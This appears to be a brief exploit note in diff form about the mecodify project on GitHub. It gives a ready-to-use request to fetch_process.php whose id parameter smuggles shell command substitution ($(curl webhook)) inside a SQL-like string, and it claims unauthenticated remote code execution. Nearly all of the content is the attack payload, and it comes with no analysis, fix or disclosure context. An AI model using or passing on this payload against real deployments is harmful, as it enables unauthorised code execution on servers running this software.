@@ -1,0 +1,10 @@
+https://github.com/wsaqaf/mecodify/
+
+https://github.com/wsaqaf/mecodify/blob/master/fetch_process.php
+
+fetch_process.php?id=WomSA'+AND+123=123+AND+'$(curl%20webhook)'='$(curl%20webhook)
+
+
+it's unauth, it's RCE with sql like payload due to constain.. olé ..
+
+
